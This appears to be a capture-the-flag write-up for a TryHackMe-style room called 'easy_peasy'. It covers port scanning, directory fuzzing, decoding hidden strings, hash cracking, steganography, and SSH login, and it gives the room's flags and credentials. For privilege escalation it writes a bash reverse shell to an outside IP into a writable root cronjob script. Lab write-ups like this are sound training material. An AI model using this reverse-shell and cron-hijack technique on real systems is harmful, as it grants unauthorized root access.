### Nmap
```
┌─[glack@parrot]─[~/Desktop/THM/easy_peasy]
└──╼ $nmap -sV -sT -A 10.10.177.226 -oN nmap.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-28 14:22 IST
Nmap scan report for 10.10.177.226
Host is up (0.13s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.16.1
|_http-title: Welcome to nginx!
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx/1.16.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.77 seconds
```


```
┌─[glack@parrot]─[~/Desktop/THM/easy_peasy]
└──╼ $nmap -T5 --min-rate=10000 -p- 10.10.177.226

PORT      STATE SERVICE
80/tcp    open  http
6498/tcp  open  unknown
65524/tcp open  unknown

```


```
nmap -sV -sT -p 80,6498,65524 10.10.177.226 -oN nmap.txt

PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


### HTTP

1. enumerating the ngix URL

```

─[glack@parrot]─[~/Desktop/THM/easy_peasy]
└──╼ $ffuf -w /usr/share/wordlists/small.txt:FUZZ -u http://10.10.177.226/FUZZ -e php,html -t 50

hidden                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 132ms
```

on visiting the /hidden page, we are give a image with some german text. Translating the german texts, it results in caution of using elevator message.

2. Apache HTTPD URL

`http://10.10.177.226:65524/robots.txt`

```
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```

3. Also found another comment hidden in `view-source:http://10.10.177.226:65524/index.html`
```  <span class="floating_element">
          Apache 2 It Works For Me
	<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
```

on decoding with base62, we get
`ObsJmP173N2X6dOrAgEAL0Vu` to `/n0th1ng3ls3m4tt3r`


4. On visiting we are given another encoded message
![[Pasted image 20230728145216.png]]

`940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81`

this was a has can cracked the has using

```
┌─[glack@parrot]─[~/Desktop/THM/easy_peasy]
└──╼ $john --wordlist=easypeasy.txt --format=gost forjohn.txt

mypasswordforthatjob (?)

```

5. Got fed up here and went for the writeup

![[Pasted image 20230728161438.png]]

Cracked the hash `a18672860d0510e5ab6699730763b250` at 
`https://md5hashing.net/hash/md5/a18672860d0510e5ab6699730763b250`

we get `flag{1m_s3c0nd_fl4g}`

6. We also had to download the image 
```
 $wget http://10.10.177.226:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg

```

extract the content using

```
┌─[glack@parrot]─[~/Desktop/THM/easy_peasy]
└──╼ $steghide extract -sf binarycodepixabay.jpg 
Enter passphrase:  mypasswordforthatjob
"secrettext.txt"
```

```
─[glack@parrot]─[~/Desktop/THM/easy_peasy]
└──╼ $cat secrettext.txt 
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```

binary text can be decoded to `iconvertedmypasswordtobinary`


### Shell


1. logged into ssh as boring
```
boring@kral4-PC:~$ cat user.txt 
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
```

ROT13

```
flag{n0wits33msn0rm4l}
```
``
### Priv ESC

1. Cronjob running 
```
cd /var/www/ && sudo bash .mysecretcronjob.sh
```

since file was writable, changed the contents to a reverse shell

`bash -i >& /dev/tcp/10.17.24.189/9999 0>&1`

```
┌─[glack@parrot]─[~/Desktop/shellgen]
└──╼ $nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.17.24.189] from (UNKNOWN) [10.10.177.226] 49826
bash: cannot set terminal process group (1865): Inappropriate ioctl for device
bash: no job control in this shell

root@kral4-PC:/var/www# 
```

```
root@kral4-PC:~# cat .root.txt
cat .root.txt
flag{63a9f0ea7bb98050796b649e85481845}
```
